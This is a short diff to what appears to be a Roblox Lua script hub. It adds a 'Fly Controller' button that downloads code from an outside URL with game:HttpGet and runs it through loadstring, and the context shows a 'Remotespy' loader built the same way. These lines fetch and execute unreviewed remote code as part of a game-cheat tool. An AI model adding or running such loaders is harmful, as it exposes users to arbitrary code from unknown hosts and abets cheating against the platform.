@@ -377,6 +377,11 @@ AddScriptButton("Sambung Kata V3", function()
     ShowNotification("Animation Executed!")
 end)
 
+AddScriptButton("Fly Controller", function()
+    loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=kuramaid04"))("kuramaid04")
+    ShowNotification("Animation Executed!")
+end)
+
 AddScriptButton("Remotespy Fayint", function()
     loadstring(game:HttpGet("https://fayintz.my.id/api/loader/Scanner-Remote"))()
     ShowNotification("Animation Executed!")
